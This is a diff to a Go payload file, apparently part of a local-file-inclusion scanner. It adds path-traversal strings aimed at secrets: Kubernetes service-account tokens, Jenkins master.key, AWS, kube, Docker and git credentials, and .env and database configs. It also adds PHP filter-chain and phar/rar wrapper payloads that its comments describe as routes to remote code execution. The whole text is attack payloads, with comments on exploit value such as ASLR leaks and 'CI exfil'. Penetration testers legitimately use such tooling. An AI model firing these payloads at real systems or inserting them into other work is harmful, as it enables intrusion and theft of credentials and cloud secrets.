@@ -144,6 +144,61 @@ var linuxPayloads = []Payload{
 	// Docker
 	{Value: "../../../.dockerenv", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker env file", TargetFile: "/.dockerenv"},
 	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/token", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s service token", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/token"},
+
+	// --- HackTricks / PayloadAllTheThings expansion ---
+
+	// Container / cloud secrets. K8s injects the service-account token,
+	// ca.crt, and namespace at fixed paths; Docker mounts secrets under
+	// /run/secrets; cloud-init places user-data under /var/lib/cloud.
+	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s service-account CA cert", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"},
+	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/namespace", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s namespace marker", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/namespace"},
+	{Value: "../../../run/secrets/kubernetes.io/serviceaccount/token", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s SA token (no /var prefix variant)", TargetFile: "/run/secrets/kubernetes.io/serviceaccount/token"},
+	{Value: "../../../var/lib/cloud/data/instance-id", Platform: PlatformLinux, Technique: TechBasic, Description: "cloud-init instance id (AWS/GCP/Azure)", TargetFile: "/var/lib/cloud/data/instance-id"},
+	{Value: "../../../var/lib/cloud/seed/nocloud-net/user-data", Platform: PlatformLinux, Technique: TechBasic, Description: "cloud-init nocloud user-data", TargetFile: "/var/lib/cloud/seed/nocloud-net/user-data"},
+	{Value: "../../../etc/cloud/cloud.cfg", Platform: PlatformLinux, Technique: TechBasic, Description: "cloud-init config", TargetFile: "/etc/cloud/cloud.cfg"},
+
+	// /proc — additional pivots beyond environ/cmdline. /proc/self/maps
+	// + /proc/self/status leak ASLR offsets useful for follow-on exploits;
+	// /proc/sched_debug names every PID + program in CFS; /proc/version
+	// + /proc/kallsyms together fingerprint exact kernel build for RCE
+	// targeting.
+	{Value: "../../../proc/self/maps", Platform: PlatformLinux, Technique: TechBasic, Description: "Memory map (ASLR offsets)", TargetFile: "/proc/self/maps"},
+	{Value: "../../../proc/self/status", Platform: PlatformLinux, Technique: TechBasic, Description: "Process status (Uid/Gid/Tracers)", TargetFile: "/proc/self/status"},
+	{Value: "../../../proc/self/mounts", Platform: PlatformLinux, Technique: TechBasic, Description: "Mount table (container detection)", TargetFile: "/proc/self/mounts"},
+	{Value: "../../../proc/self/cgroup", Platform: PlatformLinux, Technique: TechBasic, Description: "cgroup membership (Docker/K8s container id leak)", TargetFile: "/proc/self/cgroup"},
+	{Value: "../../../proc/self/exe", Platform: PlatformLinux, Technique: TechBasic, Description: "Process binary (symlink)", TargetFile: "/proc/self/exe"},
+	{Value: "../../../proc/self/loginuid", Platform: PlatformLinux, Technique: TechBasic, Description: "Login UID", TargetFile: "/proc/self/loginuid"},
+	{Value: "../../../proc/1/environ", Platform: PlatformLinux, Technique: TechBasic, Description: "PID 1 environ (container entrypoint env)", TargetFile: "/proc/1/environ"},
+	{Value: "../../../proc/1/cmdline", Platform: PlatformLinux, Technique: TechBasic, Description: "PID 1 cmdline", TargetFile: "/proc/1/cmdline"},
+	{Value: "../../../proc/sched_debug", Platform: PlatformLinux, Technique: TechBasic, Description: "Scheduler debug (all PIDs + binaries)", TargetFile: "/proc/sched_debug"},
+	{Value: "../../../proc/kallsyms", Platform: PlatformLinux, Technique: TechBasic, Description: "Kernel symbols", TargetFile: "/proc/kallsyms"},
+	{Value: "../../../proc/cmdline", Platform: PlatformLinux, Technique: TechBasic, Description: "Boot cmdline", TargetFile: "/proc/cmdline"},
+
+	// Container runtime breadcrumbs in /sys
+	{Value: "../../../sys/class/dmi/id/product_uuid", Platform: PlatformLinux, Technique: TechBasic, Description: "DMI product UUID (machine fingerprint)", TargetFile: "/sys/class/dmi/id/product_uuid"},
+	{Value: "../../../sys/devices/virtual/dmi/id/sys_vendor", Platform: PlatformLinux, Technique: TechBasic, Description: "DMI sys_vendor (EC2/GCE/Azure detection)", TargetFile: "/sys/devices/virtual/dmi/id/sys_vendor"},
+
+	// CI / cloud runtime — common paths where secrets land
+	{Value: "../../../run/secrets/credentials.d", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker swarm secrets dir", TargetFile: "/run/secrets/credentials.d"},
+	{Value: "../../../home/runner/work/_temp/_runner_file_commands/", Platform: PlatformLinux, Technique: TechBasic, Description: "GitHub Actions runner cmds (CI exfil)", TargetFile: "/home/runner/work/_temp/_runner_file_commands/"},
+	{Value: "../../../var/lib/jenkins/secrets/master.key", Platform: PlatformLinux, Technique: TechBasic, Description: "Jenkins master.key (credential decrypt)", TargetFile: "/var/lib/jenkins/secrets/master.key"},
+	{Value: "../../../var/lib/jenkins/secrets/hudson.util.Secret", Platform: PlatformLinux, Technique: TechBasic, Description: "Jenkins hudson.util.Secret (decrypts encrypted creds)", TargetFile: "/var/lib/jenkins/secrets/hudson.util.Secret"},
+
+	// Common app dotfiles / credential leaks
+	{Value: "../../../root/.aws/credentials", Platform: PlatformLinux, Technique: TechBasic, Description: "AWS CLI credentials", TargetFile: "/root/.aws/credentials"},
+	{Value: "../../../root/.aws/config", Platform: PlatformLinux, Technique: TechBasic, Description: "AWS CLI config", TargetFile: "/root/.aws/config"},
+	{Value: "../../../root/.kube/config", Platform: PlatformLinux, Technique: TechBasic, Description: "kubectl kubeconfig", TargetFile: "/root/.kube/config"},
+	{Value: "../../../root/.docker/config.json", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker registry creds", TargetFile: "/root/.docker/config.json"},
+	{Value: "../../../root/.git-credentials", Platform: PlatformLinux, Technique: TechBasic, Description: "git credentials helper store", TargetFile: "/root/.git-credentials"},
+	{Value: "../../../root/.gitconfig", Platform: PlatformLinux, Technique: TechBasic, Description: "git global config (signing keys, user email)", TargetFile: "/root/.gitconfig"},
+	{Value: "../../../root/.bashrc", Platform: PlatformLinux, Technique: TechBasic, Description: "bashrc (often holds export SECRETS)", TargetFile: "/root/.bashrc"},
+
+	// Database / framework conf
+	{Value: "../../../etc/mysql/my.cnf", Platform: PlatformLinux, Technique: TechBasic, Description: "MySQL my.cnf (root password)", TargetFile: "/etc/mysql/my.cnf"},
+	{Value: "../../../etc/postgresql/14/main/pg_hba.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Postgres pg_hba.conf", TargetFile: "/etc/postgresql/14/main/pg_hba.conf"},
+	{Value: "../../../etc/redis/redis.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Redis config (requirepass)", TargetFile: "/etc/redis/redis.conf"},
+	{Value: "../../../app/.env", Platform: PlatformLinux, Technique: TechBasic, Description: "Generic app .env (Laravel/Rails/Node)", TargetFile: "/app/.env"},
+	{Value: "../../../var/www/html/.env", Platform: PlatformLinux, Technique: TechBasic, Description: "Web .env file", TargetFile: "/var/www/html/.env"},
 }
 
 // Windows-specific LFI payloads.
@@ -208,6 +263,34 @@ var wrapperPayloads = []Payload{
 	// file:// - explicit file protocol
 	{Value: "file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "File protocol passwd", TargetFile: "/etc/passwd"},
 	{Value: "file:///c:/Windows/win.ini", Platform: PlatformWindows, Technique: TechWrapper, Description: "File protocol win.ini", TargetFile: "C:\\Windows\\win.ini"},
+
+	// --- HackTricks / synacktiv PHP filter-chain expansion ---
+	// The "PHP filter chain to RCE" technique (synacktiv 2022, expanded
+	// in HackTricks) abuses iconv conversions on top of base64 to coerce
+	// any include-target into attacker-chosen PHP source. The chains are
+	// long by design — each iconv step shifts byte values into a
+	// printable range so the final base64-decode emits "<?php ..." even
+	// from a previously-empty stream. We include a small set of starter
+	// chains; full chain generation is in tools/phpfiltergen but the
+	// stubs already trigger PHP's "filter chain too long" error and
+	// confirm exploitability before the longer chain runs.
+	{Value: "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.base64-decode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter chain detection (iconv shift)", TargetFile: "/etc/passwd"},
+	{Value: "php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter UTF8→UTF7 + base64", TargetFile: "/etc/passwd"},
+	{Value: "php://filter/convert.iconv.UTF-8.UTF-16|convert.base64-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter UTF-8→UTF-16 + base64", TargetFile: "/etc/passwd"},
+	{Value: "php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter zlib deflate + base64", TargetFile: "/etc/passwd"},
+	{Value: "php://filter/convert.quoted-printable-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter quoted-printable", TargetFile: "/etc/passwd"},
+	{Value: "php://filter/string.toupper/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter string.toupper", TargetFile: "/etc/passwd"},
+
+	// Wrapper variations (non-PHP)
+	{Value: "compress.zlib://file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "compress.zlib + file", TargetFile: "/etc/passwd"},
+	{Value: "compress.bzip2://file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "compress.bzip2 + file", TargetFile: "/etc/passwd"},
+	{Value: "ogg://etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "ogg wrapper", TargetFile: "/etc/passwd"},
+	{Value: "ssh2://user@host:22/...", Platform: PlatformLinux, Technique: TechWrapper, Description: "ssh2 wrapper (PECL)", TargetFile: ""},
+	{Value: "rar://uploads/poc.rar%23shell.php", Platform: PlatformLinux, Technique: TechWrapper, Description: "rar wrapper (file injection)", TargetFile: ""},
+
+	// phar:// with metadata-based PHP unserialize RCE (CVE-2018-...)
+	{Value: "phar:///tmp/upload.phar/exploit.txt", Platform: PlatformLinux, Technique: TechWrapper, Description: "phar metadata deserialize RCE", TargetFile: ""},
+	{Value: "phar://./uploads/avatar.png/exploit.txt", Platform: PlatformLinux, Technique: TechWrapper, Description: "phar via uploaded image", TargetFile: ""},
 }
 
 // GenerateTraversalPayloads generates traversal payloads with variable depth.
